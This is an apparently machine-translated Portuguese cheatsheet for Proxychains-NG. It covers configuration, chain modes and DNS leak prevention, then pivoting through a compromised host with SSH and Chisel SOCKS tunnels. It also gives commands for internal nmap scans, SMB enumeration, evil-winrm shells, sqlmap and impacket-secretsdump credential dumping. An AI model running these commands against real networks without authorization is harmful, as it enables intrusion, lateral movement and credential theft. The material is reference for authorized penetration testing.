<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⛓️ Proxychains – Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ ██║     ███████║███████║██║██╔██╗ ██║███████╗
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  ██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
       Force Any TCP Connection Through SOCKS4, SOCKS5, and HTTP Proxies
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Proxychains-Proxychains--NG-blue?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunneling-orange?style=for-the-badge" alt="Pivotação e tunelamento">
  <img src="https://img.shields.io/badge/Protocols-SOCKS4_SOCKS5_HTTP-green?style=for-the-badge" alt="Protocolos">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licença GPLv2">
</p>

<p alinhar="centro">
  <b>🌐 Roteie ferramentas de rede CLI padrão do Linux dinamicamente por meio de SOCKS multi-hop e proxies HTTP via LD_PRELOAD</b>
</p>

---

## 📋 Índice

- [Visão geral e como funciona o Proxychains](#-overview--how-proxychains-works)
- [Instalação](#-instalação)
- [Arquivos de configuração e hierarquia de pesquisa](#-arquivos de configuração--hierarquia de pesquisa)
- [Modos de encadeamento explicados](#-modos de encadeamento explicados)
  - [`dynamic_chain` (recomendado)](#dynamic_chain-recomendado)
  - [`strict_chain`](#strict_chain)
  - [`round_robin_chain`](#round_robin_chain)
  - [`random_chain`](#random_chain)
- [Prevenção de vazamentos de DNS (`proxy_dns`)](#-dns-leaks-prevention-proxy_dns)
- [Configurando listas de proxy](#-configurando-proxy-lists)
- [Fluxos de trabalho dinâmicos](#-fluxos de trabalho dinâmicos)
  - [Proxy SSH Dynamic SOCKS (`ssh -D`)](#ssh-dynamic-socks-proxy-ssh--d)
  - [Relé de meias cinzel e Ligolo-ng] (#cinzel--ligolo-ng-socks-relay)
- [Integração de ferramentas e dicas](#-integração de ferramentas--pegadinhas)
  - [Nmap com Proxychains (Por que `-sS` falha)](#nmap-with-proxychains-why--ss-fails)
  - [Ferramentas do Active Directory (NetExec, Evil-WinRM, Impacket)](#active-directory-tools-netexec-evil-winrm-impacket)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e OPSEC](#-considerações defensivas--opsec)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e como funciona o Proxychains

**Proxychains** (bifurcação ativa moderna: **Proxychains-NG** / `proxychains4`) permite executar qualquer comando dinâmico por meio de proxies SOCKS4, SOCKS5 ou HTTP(S) encadeados únicos ou múltiplos.

Ele funciona pré-carregando uma biblioteca de gancho personalizada (`libproxychains4.so`) usando o mecanismo de linker dinâmico (`LD_PRELOAD`). Isso intercepta chamadas de API de soquete (`connect()`, `gethostbyname()`) feitas por aplicativos de destino e redireciona seu tráfego TCP para a cadeia de proxy configurada de forma transparente.

---

## 📥 Instalação
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y proxychains4

# Arch Linux
sudo pacman -S proxychains-ng

# macOS (Homebrew)
brew install proxychains-ng
```
---

## ⚙️ Arquivos de configuração e hierarquia de pesquisa

Proxychains procura seu arquivo de configuração na seguinte ordem estrita de prioridade:

1. Caminho definido na variável de ambiente `PROXYCHAINS_CONF_FILE`.
2. Arquivo passado pela flag `-f` (`proxychains4 -f ./myproxy.conf <command>`).
3. `./proxychains.conf` no diretório de trabalho atual.
4. `$(HOME)/.proxychains/proxychains.conf`.
5. `/etc/proxychains4.conf` (padrão do sistema).

---

## 🔗 Modos de encadeamento explicados

Edite `/etc/proxychains4.conf` para escolher o algoritmo de roteamento em cadeia:

### `dynamic_chain` (recomendado)
Ignora proxies mortos na lista automaticamente sem interromper a conexão. Se o Proxy nº 1 estiver ativo, o Proxy nº 2 estiver inativo e o Proxy nº 3 estiver ativo, o tráfego será roteado através de 1 -> 3.
```ini
dynamic_chain
# strict_chain
```
### `strict_chain`
Segue rigorosamente a ordem de proxy configurada. Se algum proxy na cadeia falhar ou expirar, toda a conexão será recusada.
```ini
strict_chain
```
### `round_robin_chain`
Percorre a lista de proxy sequencialmente para cada nova solicitação de conexão.
```ini
round_robin_chain
chain_len = 2
```
### `random_chain`
Seleciona aleatoriamente proxies da lista até `chain_len`.

---

## 🛡️ Prevenção de vazamentos de DNS (`proxy_dns`)

Uma das falhas mais perigosas do OPSEC durante o reconhecimento externo ou dinamização interna é o vazamento de consultas DNS para o ISP local ou gateway de destino.

Certifique-se de que `proxy_dns` esteja ativo em `/etc/proxychains4.conf`:
```ini
# Proxy all DNS requests through SOCKS5 proxy
proxy_dns

# Suppress annoying hook library stdout logs
quiet_mode
```
---

## 📝 Configurando listas de proxy

Na parte inferior de `/etc/proxychains4.conf`, em `[ProxyList]`:
```ini
[ProxyList]
# Protocol   IP               Port   [Username]  [Password]
socks5       127.0.0.1        1080
socks4       192.168.1.100    1080
http         10.10.10.50      8080   admin       SecretPass123
```
---

## 🚀 Fluxos de trabalho dinâmicos

### Proxy SSH dinâmico SOCKS (`ssh -D`)
```bash
# 1. Open background dynamic SOCKS5 proxy on local port 1080 through compromised pivot host
ssh -f -N -D 127.0.0.1:1080 user@10.10.10.50

# 2. Add entry to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# 3. Access internal machines unreachable directly from attacker box
proxychains4 curl http://172.16.20.10
```
### Relé SOCKS de cinzel e Ligolo-ng

Ao executar túneis cliente-servidor Chisel:
```bash
# Connect Chisel client with reverse SOCKS
chisel client 10.10.14.5:8000 R:1080:socks

# Route tools through Chisel tunnel
proxychains4 crackmapexec smb 172.16.50.0/24
```
---

## ⚠️ Integração de ferramentas e dicas

### Nmap com Proxychains (Por que `-sS` falha)

> [!AVISO]
> Os proxies SOCKS suportam apenas sessões TCP estabelecidas. **SYN Stealth Scans (`-sS`) falharão ou travarão** porque exigem manipulação de soquete bruto não suportada em SOCKS!
```bash
# Correct Nmap command with Proxychains (Full TCP Connect, No Ping, No DNS)
proxychains4 nmap -sT -Pn -n -sV -p 80,443,445,3389 172.16.20.10

# Scan Top 100 ports over proxy
proxychains4 nmap -sT -Pn -n --top-ports 100 172.16.20.10
```
### Ferramentas do Active Directory (NetExec, Evil-WinRM, Impacket)
```bash
# SMB enumeration through internal pivot
proxychains4 nxc smb 172.16.20.10 -u Administrator -p 'Password123'

# WinRM shell through proxychains
proxychains4 evil-winrm -i 172.16.20.10 -u Administrator -p 'Password123'

# Impacket secretsdump over SOCKS proxy
proxychains4 impacket-secretsdump domain.local/Administrator:Pass@172.16.20.10 -no-pass
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Executar comando via proxy** | `proxychains4 <command> [args]` |
| **Arquivo de configuração personalizado** | `proxychains4 -f ./custom.conf <command>` |
| **Execução silenciosa (sem banner)** | `proxychains4 -q <command>` |
| **Alvo interno de varredura TCP** | `proxychains4 nmap -sT -Pn -n -p 80,445 <IP>` |
| **Solicitação interna da Web** | `proxychains4 curl -i http://<INTERNAL_IP>` |
| **Teste SQLMap interno** | `proxychains4 sqlmap -u "http://<IP>/id=1" --batch` |
| **Sonda NetExec interna** | `proxychains4 nxc smb <SUBNET>/24` |

---

## 🛡️ Considerações defensivas e OPSEC

1. **Vazamentos de DNS:** Se `proxy_dns` estiver comentado, seu sistema resolverá nomes de host por meio de DNS local, alertando o Blue Teams sobre nomes de host direcionados.
2. **Velocidade e latência:** O encadeamento de vários proxies compõe o tempo de ida e volta (RTT). Defina tempos limite razoáveis ​​(`tcp_read_time_out 15000`, `tcp_connect_time_out 8000`).
3. **Binários estáticos:** Binários compilados estaticamente (por exemplo, binários Go/Rust que não vinculam `libc.so`) ignoram os ganchos `LD_PRELOAD` e não serão roteados por meio de Proxychains.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Esta folha de dicas destina-se apenas a testes de penetração autorizados, compromissos do Red Team e pesquisas educacionais. O roteamento de tráfego sem autorização é estritamente proibido.